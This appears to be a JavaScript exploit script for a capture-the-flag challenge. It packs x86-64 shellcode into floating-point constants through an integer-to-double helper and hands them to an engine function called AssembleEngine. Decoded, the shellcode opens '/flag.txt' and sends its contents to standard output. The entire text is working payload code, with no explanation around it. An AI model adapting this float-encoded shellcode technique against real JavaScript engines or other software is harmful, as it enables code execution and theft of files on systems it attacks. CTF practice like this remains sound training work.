var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

shellcode = [itof(0x48000000303d8d48n),itof(0xc0c748d23148f631n),itof(0x8948050f00000002n),itof(0x00000001c7c748c6n),itof(0x4900000000c2c748n),itof(0xc74800000100c2c7n),itof(0x2e050f00000028c0n),itof(0x78742e67616c662fn),itof(0x0074n),]
AssembleEngine(shellcode)
